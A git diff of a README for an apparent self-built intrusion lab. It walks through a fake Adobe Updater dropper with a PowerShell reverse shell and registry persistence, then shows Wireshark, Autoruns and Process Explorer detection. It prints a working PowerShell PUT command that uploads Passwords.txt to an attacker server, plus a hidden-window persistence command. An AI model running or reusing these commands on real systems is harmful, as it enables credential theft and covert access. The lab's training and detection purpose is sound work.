@@ -1,17 +1,37 @@
-# AdobeUpdater-RedTeamSimulation
+## 💀 AdobeUpdater Intrusion Lab: Red Team Attack + Blue Team Detection 🛡️
 
-A red team simulation that mimics an Adobe software update to deliver a PowerShell reverse shell with stealth and persistence. Designed to emulate realistic attacker behavior and test detection capabilities in a Windows environment.
+Simulates a stealthy AdobeUpdater attack to demonstrate both red team tactics and blue team detection using real-world tools in a Windows environment.
 
 ---
 
-## 🌌 Overview
+## 🧠 About This Lab
+
+This hands-on intrusion simulation demonstrates the *full attack chain* — from phishing execution to post-exploitation — followed by detailed detection and investigation using tools like **Wireshark**, **Autoruns**, and **Process Explorer**.
+
+I created everything from scratch:
+- The **fake Adobe Updater** dropper (`.hta` with VBScript)
+- Embedded **Base64-encoded PowerShell** for a reverse shell
+- **Registry persistence** and stealth icon spoofing
+- A custom **Python upload server** to simulate exfiltration
+
+🧩 The walkthrough is split into two perspectives:
+- 💀 **Red Team:** Step-by-step attack execution
+- 🛡️ **Blue Team:** Detection and triage workflow
+
+> ⚠️ This project is designed to showcase my understanding of both offensive and defensive security workflows — especially relevant to SOC analyst roles.
+
+### 🔧 **Lab Replication Coming Soon !**  
+### Want to build this exact lab yourself ? A full setup guide is in the works.
+---
+
+## 🌌 Technical Overview
 
 This simulation uses a **fake Adobe Updater UI** (`.hta`) that deploys:
 
-- **PowerShell reverse shell** to a remote Netcat listener
-- **Registry Run key persistence**
-- **Stealthy VBScript execution**
-- **Decoy visuals** to enhance realism
+- **PowerShell reverse shell** to a remote Netcat listener  
+- **Registry Run key persistence**  
+- **Stealthy VBScript execution**  
+- **Decoy visuals** to enhance realism  
 - **Base64 encoding and realistic icon spoofing**
 
 Intended for ethical red team demonstrations, SOC analyst training, and detection engineering labs.
@@ -35,8 +55,8 @@ The project directory is organized as follows:
 1. **User executes** the `.hta` payload mimicking a legitimate Adobe updater.
 2. Payload runs an embedded VBScript, which:
  - **Launches a PowerShell reverse shell**
- - **Adds a **Run registry key** for persistence**
- - **Displays a **fake update window** to distract the user**
+ - **Adds a `Run` registry key for persistence**
+ - **Displays a fake update window to distract the user**
 3. **Reverse shell is caught** by the attacker's Netcat listener.
 
 ---
@@ -54,6 +74,8 @@ one to handle file uploads as shown in Figure 2.*
 <img src="analysis/screenshots/kt1.png" alt="Kali Terminal: Upload Server" width="75%"><br>
 <em>In this terminal, the attacker starts a Python upload server on port 8080.</em>
 </p>
+
+---
 
 ### 2. Fake Adobe Updater
 *The malicious shortcut on the desktop mimics a genuine Adobe software updater.*
@@ -76,7 +98,7 @@ Next, the attacker runs the `ls` command to list the contents of the current wor
 <img src="analysis/screenshots/5.png" alt="Payload connects" width="65%"><br>
 
 ### 4. Attacker Navigates the File System
-*In Figure 7, the attacker begins backing out of the current directory using `cd` command repeating this until reaching the user's home directory.
+*In Figure 7, the attacker begins backing out of the current directory using the `cd` command repeating `cd ..` until reaching the user's home directory.
 They then run the `ls` command again and spot the Documents directory witch is there target.*
 <br><sub>(Figure 7)</sub><br>
 <img src="analysis/screenshots/6.png" alt="Directory listing" width="65%"><br>
@@ -85,63 +107,117 @@ They then run the `ls` command again and spot the Documents directory witch is t
 <br><sub>(Figure 8)</sub><br>
 <img src="analysis/screenshots/7.png" alt="Navigating directories" width="65%"><br>
 
-*In Figure 9, we the attacker has successfully navigated into the Documents folder. Inside, they spot a file named Passwords.txt.*
+*In Figure 9, we see the attacker has successfully navigated into the Documents folder. Inside, they spot a file named Passwords.txt.*
 <br><sub>(Figure 9)</sub><br>
 <img src="analysis/screenshots/8.png" alt="Accessing Documents" width="65%"><br>
 
 ---
+
 ### 5. Second Stage of the Attack: Uploading the File
 *Now that the attacker has successfully navigated through the file system and reached the Documents directory, they’ve located the Passwords.txt file.
 At this point they’re ready to begin the second stage of the attack. They’ve almost reached Step 7 of the Cyber Kill Chain — Actions on Objectives — but not quite yet.*
 
+---
+*In Figure 10, we can see the attacker preparing to use a PowerShell command with the PUT method to upload the Passwords.txt file to their Python-based upload server.*
 <br><sub>(Figure 10)</sub><br>
-<img src="analysis/screenshots/9.png" alt="Discovery of Passwords.txt" width="65%"><br>
-
-<br><sub>(Figure 11)</sub><br>
-<img src="analysis/screenshots/10.png" alt="Exfiltration command" width="65%"><br>
-
-<br><sub>(Figure 12)</sub><br>
 <img src="analysis/screenshots/11.png" alt="Upload success" width="65%"><br>
 
+*Refer to **Figure 11** for how the exfiltration command is constructed.*
+<br><sub>(Figure 11)</sub><br>
+<img src="analysis/screenshots/9.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
+Then, run the following PowerShell command to upload the `Passwords.txt` file to the attacker's Python server:
+ ```powershell
+powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
+# ⚠️ Make sure to update the IP address to match your attacker's listener
+```
 ---
+*In Figure 12, we return to the second terminal first mentioned in Figure 2. This is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*
+<br><sub>(Figure 12)</sub><br>
+<img src="analysis/screenshots/10.png" alt="Exfiltration command" width="65%"><br>
 
-### 4. Network Exfiltration Evidence (Wireshark)
-
+*Next in Figure 13, after the PowerShell command from Figure 10 is run, we get a hit — the `Passwords.txt` file is displayed in the command line output. And just like we talked about in Figure 12, the folder now shows five files, one of them being `Passwords.txt,` confirming the upload was successful.*
+<br><sub>(Figure 13)</sub><br>
 <img src="analysis/screenshots/12.png" alt="Wireshark: TCP stream" width="65%"><br>
 
-<img src="analysis/screenshots/13.png" alt="Wireshark: HTTP PUT" width="65%"><br>
+---
+## 🛡️ Defender’s Perspective: Detecting the Attack in Action
 
-<img src="analysis/screenshots/15.png" alt="Wireshark Focused" width="65%"><br>
+Now that we’ve followed the attacker’s full playbook — from clicking the fake Adobe updater to catching a reverse shell and exfiltrating `Passwords.txt` — let’s switch gears and step into the defender’s shoes.
 
-<img src="analysis/screenshots/16.png" alt="Follow Stream" width="65%"><br>
-
-<img src="analysis/screenshots/17.png" alt="HTTP Stream Selected" width="65%"><br>
-
-<img src="analysis/screenshots/18.png" alt="Exfiltrated Contents" width="65%"><br>
+This next section walks through how security analysts can spot and respond to this kind of behavior using network traffic analysis, autorun entries, and process inspection tools.
 
 ---
 
-### 5. Persistence and Detection
+In **Figure 14**, we have a Wireshark capture that was running during the attack. In this screenshot, we can see a `PUT` request made for the `Passwords.txt` file — indicating possible data exfiltration over HTTP.
+<br><sub>(Figure 14)</sub><br>
+<img src="analysis/screenshots/13.png" alt="Wireshark: HTTP PUT" width="75%"><br>
 
+In **Figure 15**, now that we’ve confirmed a PUT request occurred, we can filter the capture to isolate it. To do this, we type the following into Wireshark’s display filter bar `http.request.method == "PUT"`
+Then hit the **blue arrow** in the top-right to apply the filter.
+<br><sub>(Figure 15)</sub><br>
+<img src="analysis/screenshots/15.png" alt="Wireshark Focused" width="75%"><br>
+
+In **Figure 16**, we see there was only one `PUT` request made, which confirms our earlier finding — the exfiltrated file was `Passwords.txt`.
+<br><sub>(Figure 16)</sub><br>
+<img src="analysis/screenshots/16.png" alt="Follow Stream" width="75%"><br>
+
+Next, in **Figure 17**, if we right-click on the filtered packet and choose **Follow > HTTP Stream** (highlighted in blue). This allows us to view the entire payload of the HTTP session and validate what was transferred.
+<br><sub>(Figure 17)</sub><br>
+<img src="analysis/screenshots/18.png" alt="Exfiltrated Contents" width="65%"><br>
+
+In **Figure 18**, after following the HTTP stream, we can see the full contents of the `PUT` request — exposing exactly what the attacker exfiltrated.
+We also see other important details, such as the server responding with a `201 Created` status, confirming a successful upload. The `User-Agent` header shows the transfer was performed using `Python/3.11.9`, pointing to Python’s built-in `http.server` module.
+An internal host sending a `PUT` request over port 8080 using non-standard tools like this should raise red flags during packet inspection.
+<br><sub>(Figure 18)</sub><br>
 <img src="analysis/screenshots/19.png" alt="Autoruns Registry" width="65%"><br>
 
+---
+### 🔍 Persistence Detection via Autoruns and Registry Analysis
+
+In this section, we identify how the attacker achieved persistence using a registry-based autorun entry. The screenshots below walk through the detection process using Sysinternals Autoruns and the Windows Registry Editor.
+
+---
+
+**Figure 19** shows a suspicious autorun entry under:`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+The entry is named `AdobeTaskHelper`, but it's launching `powershell.exe` instead of a legitimate Adobe executable. This is an immediate red flag.<br>
+There is no known Adobe tool that launches via PowerShell, and the naming is clearly meant to blend in with trusted vendor software.
+<br><sub>(Figure 19)</sub><br>
 <img src="analysis/screenshots/20.png" alt="Registry Key Contents" width="65%"><br>
 
+Next, in **Figure 20** we can right-click the suspicious entry in Autoruns and choose **Jump to Entry** to check the corresponding registry location for validation.
+<br><sub>(Figure 20)</sub><br>
 <img src="analysis/screenshots/21.png" alt="Process Explorer Powershell" width="65%"><br>
 
+**Figure 21** confirms the full registry key using **Regedit**. The `AdobeTaskHelper` entry executes the following command at startup:<br>`powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ...`
+This PowerShell command is used to maintain persistence by silently relaunching the attacker’s reverse shell payload on system boot. Combined with the misleading name and stealthy execution, this is a textbook example of registry-based persistence via PowerShell masquerading.
+<br><sub>(Figure 21)</sub><br>
 <img src="analysis/screenshots/22.png" alt="Process Image Path" width="65%"><br>
 
+---
+### 🔍 Process Inspection with Process Explorer
+
+This section highlights suspicious process behavior observed using Sysinternals Process Explorer. Each figure calls out relevant evidence tied to the attacker’s execution and persistence.
+
+---
+**Figure 22** shows a suspicious `powershell.exe` process running under the user `IEUser`. This process is not expected under normal conditions and does not match any known authorized scripts.
+<br><sub>(Figure 22)</sub><br>
 <img src="analysis/screenshots/23.png" alt="TCP/IP Connections" width="65%"><br>
 
+**Figure 23** drills into the process properties of `powershell.exe`. The command line confirms it’s executing with<br>
+`-ExecutionPolicy Bypass -WindowStyle Hidden`, which is commonly used to evade detection. The **current directory** is also telling — it's set to:`C:\Users\IEUser\Downloads\Test Malware\AdobeUpdater\` This aligns directly with the malicious payload path.
+<br><sub>(Figure 23)</sub><br>
 <img src="analysis/screenshots/24.png" alt="Payload Directory" width="65%"><br>
 
+**Figure 24** shows the **TCP/IP** tab of the same process, confirming it has an active network connection to:`192.168.78.129:HTTPS`<br>This indicates that the PowerShell process is maintaining a live connection — supporting evidence of a reverse shell callback.
+<br><sub>(Figure 24)</sub><br>
 <img src="analysis/screenshots/25.png" alt="Payload Shortcut" width="65%"><br>
 
-<img src="analysis/screenshots/26.png" alt="Attacker Upload Server" width="65%"><br>
-
+**Figure 25** shows the PowerShell process’s working directory alongside the actual folder contents in File Explorer. The folder contains the Adobe files including the shortcut named `AdobeUpdater` — which was placed on the user’s desktop.This shortcut is what the user initially interacted with, triggering the chain of events. This visually confirms how the attack was disguised as a legitimate update and how the user was tricked into executing it.
+<br><sub>(Figure 25)</sub><br>
 <img src="analysis/screenshots/27.png" alt="Attacker Listener" width="65%"><br>
 
 ---
+
 
 ## 🧪 PowerShell Reverse Shell (Payload)
 
